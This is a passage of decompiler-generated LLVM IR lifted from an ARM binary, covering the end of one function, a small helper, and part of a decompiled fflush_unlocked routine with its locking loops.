  %v1_17a58 = phi i32 [ %v0_17a54, %dec_label_pc_17a54 ], [ %v2_17a28, %dec_label_pc_17a28 ], [ %v1_17a38.pre, %dec_label_pc_17a40.dec_label_pc_17a34_crit_edge ]
  %v3_17a58 = icmp uge i32 %v0_17a60, %v1_17a58
  store i1 %v3_17a58, i1* %cpsr_c.global-to-local, align 1
  %v9_17a58 = icmp eq i32 %v0_17a60, %v1_17a58
  br i1 %v9_17a58, label %dec_label_pc_17a60, label %dec_label_pc_17a58.dec_label_pc_17a28_crit_edge

dec_label_pc_17a58.dec_label_pc_17a28_crit_edge:  ; preds = %dec_label_pc_17a58
  %v0_17a28.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17a28

dec_label_pc_17a60:                               ; preds = %dec_label_pc_17a58
  %v2_17a60 = icmp ne i32 %v1_17a58, 0
  store i1 %v2_17a60, i1* %cpsr_c.global-to-local, align 1
  %v7_17a64 = icmp slt i32 %v1_17a58, 2
  br i1 %v7_17a64, label %dec_label_pc_17a80, label %dec_label_pc_17a68

dec_label_pc_17a68:                               ; preds = %dec_label_pc_17a60
  %v0_17a68 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_17a68, i32* %r0.global-to-local, align 4
  %v0_17a6c = load i32, i32* %r1.global-to-local, align 4
  %v1_17a6c = add i32 %v0_17a6c, 129
  store i32 %v1_17a6c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17a80

dec_label_pc_17a80:                               ; preds = %dec_label_pc_179f0, %dec_label_pc_17a68, %dec_label_pc_17a60
  %v2_17a84 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_17a84, i32* %r4.global-to-local, align 4
  %v1_17a88 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_17a88

; uselistorder directives
  uselistorder i32 %v0_17a54, { 1, 0, 2 }
  uselistorder i32 %v1_17a38.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17a28, { 1, 0 }
  uselistorder i32 %v0_179b4, { 1, 0, 2 }
  uselistorder i32 %v1_17998.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17988, { 1, 0 }
  uselistorder i32 %v0_17954, { 2, 1, 0 }
  uselistorder i32 %v0_178f8, { 1, 0 }
  uselistorder i32 %v0_178dc, { 1, 0, 2 }
  uselistorder i32 %v1_178c0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_178ac, { 1, 0 }
  uselistorder i32 %v0_17850, { 1, 0, 2 }
  uselistorder i32 %v1_17834.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_17808, { 2, 1, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 14, 13, 15 }
  uselistorder i32* %r6.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 41, 4, 5, 6, 7, 8, 9, 10, 12, 11, 42, 13, 14, 15, 39, 40, 16, 17, 18, 19, 20, 21, 22, 24, 23, 43, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 44, 37, 38 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 12, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 20, 21, 3, 4, 5, 6, 22, 23, 7, 10, 8, 9, 19, 11, 12, 24, 25, 13, 14, 15, 16, 17, 26, 27, 18 }
  uselistorder i32 8192, { 3, 0, 1, 2 }
  uselistorder i32 47, { 6, 0, 15, 7, 8, 9, 2, 10, 3, 11, 1, 12, 13, 4, 14, 5 }
  uselistorder i32 32816, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17a80, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17a58, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17a40, { 1, 0 }
  uselistorder label %dec_label_pc_179f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_179e0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_179b8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_179a0, { 1, 0 }
  uselistorder label %dec_label_pc_17954, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_1791c, { 1, 0 }
  uselistorder label %dec_label_pc_178f0, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_178e0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_178c8, { 1, 0 }
  uselistorder label %dec_label_pc_17864, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_17854, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1783c, { 1, 0 }
}

define i32 @function_17a90(i32 %arg1) local_unnamed_addr {
dec_label_pc_17a90:
  %v0_17a90 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17a90, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_17a90
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_17a90, %bb
  %v10_17aa4 = phi i32 [ %arg1, %dec_label_pc_17a90 ], [ 0, %bb ]
  ret i32 %v10_17aa4

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_17aa8 = load i32, i32* @r5, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* @r6, align 4
  %v4_17ab8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 76) to i32*), align 4
  store i32 %v4_17ab8, i32* %r3.global-to-local, align 4
  %v4_17abc = icmp uge i32 %tmp, %v4_17ab8
  store i1 %v4_17abc, i1* %cpsr_c.global-to-local, align 1
  %v10_17abc = icmp eq i32 %tmp, %v4_17ab8
  br i1 %v10_17abc, label %bb, label %dec_label_pc_17ad4

bb:                                               ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  br label %dec_label_pc_17ae4

dec_label_pc_17ad4:                               ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_17ad8 = icmp eq i16* %arg1, null
  br i1 %v3_17ad8, label %dec_label_pc_17ae4, label %dec_label_pc_17df8

dec_label_pc_17ae4:                               ; preds = %bb, %dec_label_pc_17ad4
  %stack_var_-44.1 = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_17ad4 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v4_17ae8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 160) to i32*), align 4
  store i32 %v4_17ae8, i32* %r5.global-to-local, align 4
  %v0_17aec = call i32 @__aeabi_read_tp()
  store i32 %v0_17aec, i32* %r0.global-to-local, align 4
  %v1_17af0 = add i32 %v4_17ae8, 8
  %v2_17af0 = inttoptr i32 %v1_17af0 to i32*
  %v3_17af0 = load i32, i32* %v2_17af0, align 4
  store i32 %v3_17af0, i32* %r3.global-to-local, align 4
  %v1_17af4 = add i32 %v0_17aec, -1168
  store i32 %v1_17af4, i32* %r8.global-to-local, align 4
  %v3_17af8 = icmp uge i32 %v3_17af0, %v1_17af4
  store i1 %v3_17af8, i1* %cpsr_c.global-to-local, align 1
  %v9_17af8 = icmp eq i32 %v3_17af0, %v1_17af4
  br i1 %v9_17af8, label %dec_label_pc_17b40, label %dec_label_pc_17b00

dec_label_pc_17b00:                               ; preds = %dec_label_pc_17ae4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_17ae8, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_17b0c143 = inttoptr i32 %v4_17ae8 to i32*
  %v2_17b0c144 = load i32, i32* %v1_17b0c143, align 4
  store i32 %v2_17b0c144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_17b10146 = icmp eq i32 %v2_17b0c144, 0
  br i1 %v9_17b10146, label %dec_label_pc_17b18, label %dec_label_pc_17b30

dec_label_pc_17b18:                               ; preds = %dec_label_pc_17b00, %dec_label_pc_17b18.dec_label_pc_17b0c_crit_edge
  %v0_17b18147 = phi i32 [ %v1_17b10.pre, %dec_label_pc_17b18.dec_label_pc_17b0c_crit_edge ], [ 0, %dec_label_pc_17b00 ]
  store i32 %v0_17b18147, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17b28 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17b28, label %dec_label_pc_17b2c, label %dec_label_pc_17b18.dec_label_pc_17b0c_crit_edge

dec_label_pc_17b18.dec_label_pc_17b0c_crit_edge:  ; preds = %dec_label_pc_17b18
  %v0_17b0c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17b10.pre = load i32, i32* @r4, align 4
  %v1_17b0c = inttoptr i32 %v0_17b0c.pre to i32*
  %v2_17b0c = load i32, i32* %v1_17b0c, align 4
  store i32 %v2_17b0c, i32* %r3.global-to-local, align 4
  %v3_17b10 = icmp uge i32 %v2_17b0c, %v1_17b10.pre
  store i1 %v3_17b10, i1* %cpsr_c.global-to-local, align 1
  %v9_17b10 = icmp eq i32 %v2_17b0c, %v1_17b10.pre
  br i1 %v9_17b10, label %dec_label_pc_17b18, label %dec_label_pc_17b30

dec_label_pc_17b2c:                               ; preds = %dec_label_pc_17b18
  %v0_17b2c = load i32, i32* @r4, align 4
  store i32 %v0_17b2c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17b30

dec_label_pc_17b30:                               ; preds = %dec_label_pc_17b00, %dec_label_pc_17b18.dec_label_pc_17b0c_crit_edge, %dec_label_pc_17b2c
  %v0_17b30 = phi i32 [ %v0_17b2c, %dec_label_pc_17b2c ], [ %v2_17b0c144, %dec_label_pc_17b00 ], [ %v2_17b0c, %dec_label_pc_17b18.dec_label_pc_17b0c_crit_edge ]
  %v1_17b30 = phi i32 [ %v0_17b2c, %dec_label_pc_17b2c ], [ 0, %dec_label_pc_17b00 ], [ %v1_17b10.pre, %dec_label_pc_17b18.dec_label_pc_17b0c_crit_edge ]
  %v3_17b30 = icmp uge i32 %v0_17b30, %v1_17b30
  store i1 %v3_17b30, i1* %cpsr_c.global-to-local, align 1
  %v9_17b30 = icmp eq i32 %v0_17b30, %v1_17b30
  br i1 %v9_17b30, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_17b30
  %v1_17b34 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_17b34, i32* %r0.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_17b30, %bb65
  %v1_17b38 = xor i1 %v9_17b30, true
  call void @__pseudo_cond_branch(i1 %v1_17b38, i32 ptrtoint (i32* @global_var_15400.643 to i32))
  %v0_17b3c = load i32, i32* %r8.global-to-local, align 4
  %v1_17b3c = load i32, i32* %r5.global-to-local, align 4
  %v2_17b3c = add i32 %v1_17b3c, 8
  %v3_17b3c = inttoptr i32 %v2_17b3c to i32*
  store i32 %v0_17b3c, i32* %v3_17b3c, align 4
  br label %dec_label_pc_17b40

dec_label_pc_17b40:                               ; preds = %dec_label_pc_17ae4, %bb66
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_17b44 = load i32, i32* @r6, align 4
  %v2_17b44 = add i32 %v0_17b44, 160
  %v3_17b44 = inttoptr i32 %v2_17b44 to i32*
  %v4_17b44 = load i32, i32* %v3_17b44, align 4
  store i32 %v4_17b44, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_17b4c = add i32 %v0_17b44, 12
  %v3_17b4c = inttoptr i32 %v2_17b4c to i32*
  %v4_17b4c = load i32, i32* %v3_17b4c, align 4
  store i32 %v4_17b4c, i32* %r2.global-to-local, align 4
  %v1_17b50 = add i32 %v4_17b44, 4
  %v2_17b50 = inttoptr i32 %v1_17b50 to i32*
  %v3_17b50 = load i32, i32* %v2_17b50, align 4
  store i32 %v3_17b50, i32* %r1.global-to-local, align 4
  %v1_17b54 = inttoptr i32 %v4_17b4c to i32*
  %v2_17b54 = load i32, i32* %v1_17b54, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17b58 = icmp eq i32 %v3_17b50, 0
  %v1_17b5c = add i32 %v2_17b54, 1
  store i32 %v1_17b5c, i32* %r3.global-to-local, align 4
  store i32 %v1_17b5c, i32* %v1_17b54, align 4
  br i1 %v2_17b58, label %dec_label_pc_17b68, label %dec_label_pc_17bc8

dec_label_pc_17b68:                               ; preds = %dec_label_pc_17b40
  %v0_17b68 = load i32, i32* %r1.global-to-local, align 4
  %v1_17b68 = load i32, i32* %r0.global-to-local, align 4
  %v2_17b68 = add i32 %v1_17b68, 8
  %v3_17b68 = inttoptr i32 %v2_17b68 to i32*
  store i32 %v0_17b68, i32* %v3_17b68, align 4
  %v0_17b6c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17b6c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_17b70

dec_label_pc_17b70:                               ; preds = %dec_label_pc_17ba0.dec_label_pc_17b70_crit_edge, %dec_label_pc_17b68
  %v0_17b70 = phi i32 [ %v0_17b70.pre, %dec_label_pc_17ba0.dec_label_pc_17b70_crit_edge ], [ %v0_17b6c, %dec_label_pc_17b68 ]
  %v1_17b70 = inttoptr i32 %v0_17b70 to i32*
  %v2_17b70 = load i32, i32* %v1_17b70, align 4
  store i32 %v2_17b70, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_17b70, i32* %r2.global-to-local, align 4
  %v2_17b7c131 = load i32, i32* %v1_17b70, align 4
  store i32 %v2_17b7c131, i32* %r3.global-to-local, align 4
  %v3_17b80133 = icmp uge i32 %v2_17b7c131, %v2_17b70
  store i1 %v3_17b80133, i1* %cpsr_c.global-to-local, align 1
  %v9_17b80139 = icmp eq i32 %v2_17b7c131, %v2_17b70
  br i1 %v9_17b80139, label %dec_label_pc_17b88, label %dec_label_pc_17ba0

dec_label_pc_17b88:                               ; preds = %dec_label_pc_17b70, %dec_label_pc_17b88.dec_label_pc_17b7c_crit_edge
  %v0_17b88140 = phi i32 [ %v1_17b80.pre, %dec_label_pc_17b88.dec_label_pc_17b7c_crit_edge ], [ %v2_17b70, %dec_label_pc_17b70 ]
  store i32 %v0_17b88140, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17b98 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17b98, label %dec_label_pc_17b9c, label %dec_label_pc_17b88.dec_label_pc_17b7c_crit_edge

dec_label_pc_17b88.dec_label_pc_17b7c_crit_edge:  ; preds = %dec_label_pc_17b88
  %v0_17b7c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17b80.pre = load i32, i32* @r4, align 4
  %v1_17b7c = inttoptr i32 %v0_17b7c.pre to i32*
  %v2_17b7c = load i32, i32* %v1_17b7c, align 4
  store i32 %v2_17b7c, i32* %r3.global-to-local, align 4
  %v3_17b80 = icmp uge i32 %v2_17b7c, %v1_17b80.pre
  store i1 %v3_17b80, i1* %cpsr_c.global-to-local, align 1
  %v9_17b80 = icmp eq i32 %v2_17b7c, %v1_17b80.pre
  br i1 %v9_17b80, label %dec_label_pc_17b88, label %dec_label_pc_17ba0

dec_label_pc_17b9c:                               ; preds = %dec_label_pc_17b88
  %v0_17b9c = load i32, i32* @r4, align 4
  store i32 %v0_17b9c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17ba0

dec_label_pc_17ba0:                               ; preds = %dec_label_pc_17b70, %dec_label_pc_17b88.dec_label_pc_17b7c_crit_edge, %dec_label_pc_17b9c
  %v0_17ba8 = phi i32 [ %v0_17b9c, %dec_label_pc_17b9c ], [ %v2_17b7c131, %dec_label_pc_17b70 ], [ %v2_17b7c, %dec_label_pc_17b88.dec_label_pc_17b7c_crit_edge ]
  %v1_17ba0 = phi i32 [ %v0_17b9c, %dec_label_pc_17b9c ], [ %v2_17b70, %dec_label_pc_17b70 ], [ %v1_17b80.pre, %dec_label_pc_17b88.dec_label_pc_17b7c_crit_edge ]
  %v3_17ba0 = icmp uge i32 %v0_17ba8, %v1_17ba0
  store i1 %v3_17ba0, i1* %cpsr_c.global-to-local, align 1
  %v9_17ba0 = icmp eq i32 %v0_17ba8, %v1_17ba0
  br i1 %v9_17ba0, label %dec_label_pc_17ba8, label %dec_label_pc_17ba0.dec_label_pc_17b70_crit_edge

dec_label_pc_17ba0.dec_label_pc_17b70_crit_edge:  ; preds = %dec_label_pc_17ba0
  %v0_17b70.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_17b70

dec_label_pc_17ba8:                               ; preds = %dec_label_pc_17ba0
  %v2_17ba8 = icmp ne i32 %v1_17ba0, 0
  store i1 %v2_17ba8, i1* %cpsr_c.global-to-local, align 1
  %v7_17bac = icmp slt i32 %v1_17ba0, 2
  br i1 %v7_17bac, label %dec_label_pc_17bc8, label %dec_label_pc_17bb0

dec_label_pc_17bb0:                               ; preds = %dec_label_pc_17ba8
  %v0_17bb0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_17bb0, i32* %r0.global-to-local, align 4
  %v0_17bb4 = load i32, i32* %r1.global-to-local, align 4
  %v1_17bb4 = add i32 %v0_17bb4, 129
  store i32 %v1_17bb4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17bc8

dec_label_pc_17bc8:                               ; preds = %dec_label_pc_17b40, %dec_label_pc_17bb0, %dec_label_pc_17ba8
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_17bcc = load i32, i32* @r6, align 4
  %v2_17bcc = add i32 %v0_17bcc, 152
  %v3_17bcc = inttoptr i32 %v2_17bcc to i32*
  %v4_17bcc = load i32, i32* %v3_17bcc, align 4
  store i32 %v4_17bcc, i32* %r5.global-to-local, align 4
  %v1_17bd0 = add i32 %v4_17bcc, 8
  %v2_17bd0 = inttoptr i32 %v1_17bd0 to i32*
  %v3_17bd0 = load i32, i32* %v2_17bd0, align 4
  store i32 %v3_17bd0, i32* %r3.global-to-local, align 4
  %v1_17bd4 = load i32, i32* %r8.global-to-local, align 4
  %v3_17bd4 = icmp uge i32 %v3_17bd0, %v1_17bd4
  store i1 %v3_17bd4, i1* %cpsr_c.global-to-local, align 1
  %v9_17bd4 = icmp eq i32 %v3_17bd0, %v1_17bd4
  br i1 %v9_17bd4, label %dec_label_pc_17c1c, label %dec_label_pc_17bdc

dec_label_pc_17bdc:                               ; preds = %dec_label_pc_17bc8
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_17bcc, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_17be8123 = inttoptr i32 %v4_17bcc to i32*
  %v2_17be8124 = load i32, i32* %v1_17be8123, align 4
  store i32 %v2_17be8124, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_17bec126 = icmp eq i32 %v2_17be8124, 0
  br i1 %v9_17bec126, label %dec_label_pc_17bf4, label %dec_label_pc_17c0c

dec_label_pc_17bf4:                               ; preds = %dec_label_pc_17bdc, %dec_label_pc_17bf4.dec_label_pc_17be8_crit_edge
  %v0_17bf4127 = phi i32 [ %v1_17bec.pre, %dec_label_pc_17bf4.dec_label_pc_17be8_crit_edge ], [ 0, %dec_label_pc_17bdc ]
  store i32 %v0_17bf4127, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17c04 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17c04, label %dec_label_pc_17c08, label %dec_label_pc_17bf4.dec_label_pc_17be8_crit_edge

dec_label_pc_17bf4.dec_label_pc_17be8_crit_edge:  ; preds = %dec_label_pc_17bf4
  %v0_17be8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17bec.pre = load i32, i32* @r4, align 4
  %v1_17be8 = inttoptr i32 %v0_17be8.pre to i32*
  %v2_17be8 = load i32, i32* %v1_17be8, align 4
  store i32 %v2_17be8, i32* %r3.global-to-local, align 4
  %v3_17bec = icmp uge i32 %v2_17be8, %v1_17bec.pre
  store i1 %v3_17bec, i1* %cpsr_c.global-to-local, align 1
  %v9_17bec = icmp eq i32 %v2_17be8, %v1_17bec.pre
  br i1 %v9_17bec, label %dec_label_pc_17bf4, label %dec_label_pc_17c0c

dec_label_pc_17c08:                               ; preds = %dec_label_pc_17bf4
  %v0_17c08 = load i32, i32* @r4, align 4
  store i32 %v0_17c08, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17c0c

dec_label_pc_17c0c:                               ; preds = %dec_label_pc_17bdc, %dec_label_pc_17bf4.dec_label_pc_17be8_crit_edge, %dec_label_pc_17c08
  %v0_17c0c = phi i32 [ %v0_17c08, %dec_label_pc_17c08 ], [ %v2_17be8124, %dec_label_pc_17bdc ], [ %v2_17be8, %dec_label_pc_17bf4.dec_label_pc_17be8_crit_edge ]
  %v1_17c0c = phi i32 [ %v0_17c08, %dec_label_pc_17c08 ], [ 0, %dec_label_pc_17bdc ], [ %v1_17bec.pre, %dec_label_pc_17bf4.dec_label_pc_17be8_crit_edge ]
  %v3_17c0c = icmp uge i32 %v0_17c0c, %v1_17c0c
  store i1 %v3_17c0c, i1* %cpsr_c.global-to-local, align 1
  %v9_17c0c = icmp eq i32 %v0_17c0c, %v1_17c0c
  br i1 %v9_17c0c, label %bb68, label %bb67

bb67:                                             ; preds = %dec_label_pc_17c0c
  %v1_17c10 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_17c10, i32* %r0.global-to-local, align 4
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_17c0c, %bb67
  %v1_17c14 = xor i1 %v9_17c0c, true
  call void @__pseudo_cond_branch(i1 %v1_17c14, i32 ptrtoint (i32* @global_var_15400.643 to i32))
  %v0_17c18 = load i32, i32* %r8.global-to-local, align 4
  %v1_17c18 = load i32, i32* %r5.global-to-local, align 4
  %v2_17c18 = add i32 %v1_17c18, 8
  %v3_17c18 = inttoptr i32 %v2_17c18 to i32*
  store i32 %v0_17c18, i32* %v3_17c18, align 4
  %v0_17c20.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_17c1c

dec_label_pc_17c1c:                               ; preds = %dec_label_pc_17bc8, %bb68
  %v0_17c2c = phi i32 [ %v0_17bcc, %dec_label_pc_17bc8 ], [ %v0_17c20.pre, %bb68 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_17c20 = add i32 %v0_17c2c, 152
  %v3_17c20 = inttoptr i32 %v2_17c20 to i32*
  %v4_17c20 = load i32, i32* %v3_17c20, align 4
  store i32 %v4_17c20, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v1_17c28 = add i32 %v4_17c20, 4
  %v2_17c28 = inttoptr i32 %v1_17c28 to i32*
  %v3_17c28 = load i32, i32* %v2_17c28, align 4
  store i32 %v3_17c28, i32* %r1.global-to-local, align 4
  %v2_17c2c = add i32 %v0_17c2c, 76
  %v3_17c2c = inttoptr i32 %v2_17c2c to i32*
  %v4_17c2c = load i32, i32* %v3_17c2c, align 4
  store i32 %v4_17c2c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17c30 = icmp eq i32 %v3_17c28, 0
  %v1_17c34 = inttoptr i32 %v4_17c2c to i32*
  %v2_17c34 = load i32, i32* %v1_17c34, align 4
  store i32 %v2_17c34, i32* @r5, align 4
  br i1 %v2_17c30, label %dec_label_pc_17c3c, label %dec_label_pc_17c9c

dec_label_pc_17c3c:                               ; preds = %dec_label_pc_17c1c
  %v2_17c3c = add i32 %v4_17c20, 8
  %v3_17c3c = inttoptr i32 %v2_17c3c to i32*
  store i32 0, i32* %v3_17c3c, align 4
  %v0_17c40 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17c40, i32* @r7, align 4
  br label %dec_label_pc_17c44

dec_label_pc_17c44:                               ; preds = %dec_label_pc_17c74.dec_label_pc_17c44_crit_edge, %dec_label_pc_17c3c
  %v0_17c44 = phi i32 [ %v0_17c44.pre, %dec_label_pc_17c74.dec_label_pc_17c44_crit_edge ], [ %v0_17c40, %dec_label_pc_17c3c ]
  %v1_17c44 = inttoptr i32 %v0_17c44 to i32*
  %v2_17c44 = load i32, i32* %v1_17c44, align 4
  store i32 %v2_17c44, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_17c44, i32* %r2.global-to-local, align 4
  %v2_17c50111 = load i32, i32* %v1_17c44, align 4
  store i32 %v2_17c50111, i32* %r3.global-to-local, align 4
  %v3_17c54113 = icmp uge i32 %v2_17c50111, %v2_17c44
  store i1 %v3_17c54113, i1* %cpsr_c.global-to-local, align 1
  %v9_17c54119 = icmp eq i32 %v2_17c50111, %v2_17c44
  br i1 %v9_17c54119, label %dec_label_pc_17c5c, label %dec_label_pc_17c74

dec_label_pc_17c5c:                               ; preds = %dec_label_pc_17c44, %dec_label_pc_17c5c.dec_label_pc_17c50_crit_edge
  %v0_17c5c120 = phi i32 [ %v1_17c54.pre, %dec_label_pc_17c5c.dec_label_pc_17c50_crit_edge ], [ %v2_17c44, %dec_label_pc_17c44 ]
  store i32 %v0_17c5c120, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17c6c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17c6c, label %dec_label_pc_17c70, label %dec_label_pc_17c5c.dec_label_pc_17c50_crit_edge

dec_label_pc_17c5c.dec_label_pc_17c50_crit_edge:  ; preds = %dec_label_pc_17c5c
  %v0_17c50.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17c54.pre = load i32, i32* @r4, align 4
  %v1_17c50 = inttoptr i32 %v0_17c50.pre to i32*
  %v2_17c50 = load i32, i32* %v1_17c50, align 4
  store i32 %v2_17c50, i32* %r3.global-to-local, align 4
  %v3_17c54 = icmp uge i32 %v2_17c50, %v1_17c54.pre
  store i1 %v3_17c54, i1* %cpsr_c.global-to-local, align 1
  %v9_17c54 = icmp eq i32 %v2_17c50, %v1_17c54.pre
  br i1 %v9_17c54, label %dec_label_pc_17c5c, label %dec_label_pc_17c74

dec_label_pc_17c70:                               ; preds = %dec_label_pc_17c5c
  %v0_17c70 = load i32, i32* @r4, align 4
  store i32 %v0_17c70, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17c74

dec_label_pc_17c74:                               ; preds = %dec_label_pc_17c44, %dec_label_pc_17c5c.dec_label_pc_17c50_crit_edge, %dec_label_pc_17c70
  %v0_17c7c = phi i32 [ %v0_17c70, %dec_label_pc_17c70 ], [ %v2_17c50111, %dec_label_pc_17c44 ], [ %v2_17c50, %dec_label_pc_17c5c.dec_label_pc_17c50_crit_edge ]
  %v1_17c74 = phi i32 [ %v0_17c70, %dec_label_pc_17c70 ], [ %v2_17c44, %dec_label_pc_17c44 ], [ %v1_17c54.pre, %dec_label_pc_17c5c.dec_label_pc_17c50_crit_edge ]
  %v3_17c74 = icmp uge i32 %v0_17c7c, %v1_17c74
  store i1 %v3_17c74, i1* %cpsr_c.global-to-local, align 1
  %v9_17c74 = icmp eq i32 %v0_17c7c, %v1_17c74
  br i1 %v9_17c74, label %dec_label_pc_17c7c, label %dec_label_pc_17c74.dec_label_pc_17c44_crit_edge

dec_label_pc_17c74.dec_label_pc_17c44_crit_edge:  ; preds = %dec_label_pc_17c74
  %v0_17c44.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_17c44

dec_label_pc_17c7c:                               ; preds = %dec_label_pc_17c74
  %v2_17c7c = icmp ne i32 %v1_17c74, 0
  store i1 %v2_17c7c, i1* %cpsr_c.global-to-local, align 1
  %v7_17c80 = icmp slt i32 %v1_17c74, 2
  br i1 %v7_17c80, label %dec_label_pc_17c9cthread-pre-split, label %dec_label_pc_17c84

dec_label_pc_17c84:                               ; preds = %dec_label_pc_17c7c
  %v0_17c84 = load i32, i32* @r7, align 4
